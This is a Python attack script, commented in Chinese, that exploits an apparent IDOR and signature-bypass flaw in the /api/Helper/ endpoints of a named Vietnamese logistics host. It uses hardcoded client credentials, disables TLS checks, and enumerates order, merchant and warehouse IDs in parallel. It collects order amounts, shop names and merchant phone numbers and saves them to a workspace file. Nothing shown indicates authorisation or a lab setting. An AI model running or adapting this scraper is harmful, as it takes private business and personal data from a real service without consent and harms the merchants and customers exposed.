#!/usr/bin/env python3
"""
大规模IDOR扫描 - 使用/api/Helper/绕过RSA签名
"""

import requests
import json
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
urllib3.disable_warnings()

BASE_URL = "https://gwmobile.emsone.com.vn"

HEADERS = {
    'X-Client-ID': 'android_app_987654',
    'X-Client-Secret': 'android_s3cr3t_uvwxzy',
    'Content-Type': 'application/json',
}

results = {
    'orders': [],
    'shops': [],
    'products': [],
    'warehouses': [],
    'customers': []
}

def scan_order(order_id):
    """扫描订单ID"""
    try:
        r = requests.post(
            f"{BASE_URL}/api/Helper/ORDER_GET_BY_ID",
            json={"ID": order_id},
            headers=HEADERS,
            timeout=5,
            verify=False
        )
        
        if r.status_code == 200:
            result = r.json()
            # 检查是否有真实数据
            if result and (result.get('OrderCode') or result.get('EMSOneCode') or result.get('TotalAmount', 0) > 0):
                print(f"✅ 订单 {order_id}: {result.get('OrderCode')} - {result.get('StatusName')}")
                return {'id': order_id, 'data': result}
    except:
        pass
    return None

def scan_shop(shop_id):
    """扫描商户ID"""
    try:
        r = requests.post(
            f"{BASE_URL}/api/Helper/SHOP_GET_BY_ID",
            json={"ID": shop_id},
            headers=HEADERS,
            timeout=5,
            verify=False
        )
        
        if r.status_code == 200:
            result = r.json()
            if result and (result.get('ShopName') or result.get('MobileNumber')):
                print(f"✅ 商户 {shop_id}: {result.get('ShopName')} - {result.get('MobileNumber')}")
                return {'id': shop_id, 'data': result}
    except:
        pass
    return None

def scan_warehouse(warehouse_id):
    """扫描仓库ID"""
    try:
        r = requests.post(
            f"{BASE_URL}/api/Helper/WAREHOUSE_GET_BY_ID",
            json={"ID": warehouse_id},
            headers=HEADERS,
            timeout=5,
            verify=False
        )
        
        if r.status_code == 200:
            result = r.json()
            if result and (result.get('WareHouseName') or result.get('Address')):
                print(f"✅ 仓库 {warehouse_id}: {result.get('WareHouseName')}")
                return {'id': warehouse_id, 'data': result}
    except:
        pass
    return None

def scan_products():
    """获取产品列表"""
    try:
        r = requests.post(
            f"{BASE_URL}/api/Helper/PRODUCT_LIST",
            json={},
            headers=HEADERS,
            timeout=10,
            verify=False
        )
        
        if r.status_code == 200:
            result = r.json()
            if isinstance(result, list) and len(result) > 0:
                print(f"✅ 产品列表: {len(result)} 个产品")
                return result
    except:
        pass
    return []

def scan_warehouses():
    """获取仓库列表"""
    try:
        r = requests.post(
            f"{BASE_URL}/api/Helper/WAREHOUSE_LIST",
            json={},
            headers=HEADERS,
            timeout=10,
            verify=False
        )
        
        if r.status_code == 200:
            result = r.json()
            if isinstance(result, list) and len(result) > 0:
                print(f"✅ 仓库列表: {len(result)} 个仓库")
                return result
    except:
        pass
    return []

def main():
    print("="*70)
    print(" 🔥 大规模IDOR扫描 - 绕过RSA签名")
    print("="*70)
    
    # 1. 扫描订单 (1-100)
    print("\n[1] 扫描订单ID (1-100)...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(scan_order, i) for i in range(1, 101)]
        for future in as_completed(futures):
            result = future.result()
            if result:
                results['orders'].append(result)
    
    print(f"\n   找到 {len(results['orders'])} 个订单")
    
    # 2. 扫描商户 (1-50)
    print("\n[2] 扫描商户ID (1-50)...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(scan_shop, i) for i in range(1, 51)]
        for future in as_completed(futures):
            result = future.result()
            if result:
                results['shops'].append(result)
    
    print(f"\n   找到 {len(results['shops'])} 个商户")
    
    # 3. 扫描仓库 (1-30)
    print("\n[3] 扫描仓库ID (1-30)...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(scan_warehouse, i) for i in range(1, 31)]
        for future in as_completed(futures):
            result = future.result()
            if result:
                results['warehouses'].append(result)
    
    print(f"\n   找到 {len(results['warehouses'])} 个仓库")
    
    # 4. 获取产品列表
    print("\n[4] 获取产品列表...")
    products = scan_products()
    results['products'] = products
    
    # 5. 获取仓库列表
    print("\n[5] 获取仓库列表...")
    warehouses = scan_warehouses()
    
    # 6. 保存结果
    print("\n" + "="*70)
    print(" 📊 扫描结果汇总")
    print("="*70)
    print(f"\n订单: {len(results['orders'])} 个")
    print(f"商户: {len(results['shops'])} 个")
    print(f"仓库: {len(results['warehouses'])} 个")
    print(f"产品: {len(results['products'])} 个")
    
    # 保存到文件
    with open('/workspace/scan_results.json', 'w') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    print(f"\n✅ 结果已保存到 /workspace/scan_results.json")
    
    # 显示部分数据
    if results['orders']:
        print("\n📦 订单示例:")
        for order in results['orders'][:3]:
            print(f"  ID {order['id']}: {order['data'].get('OrderCode')} - {order['data'].get('TotalAmount')}")
    
    if results['shops']:
        print("\n🏪 商户示例:")
        for shop in results['shops'][:3]:
            print(f"  ID {shop['id']}: {shop['data'].get('ShopName')} - {shop['data'].get('MobileNumber')}")
    
    print("\n" + "="*70)

if __name__ == "__main__":
    main()
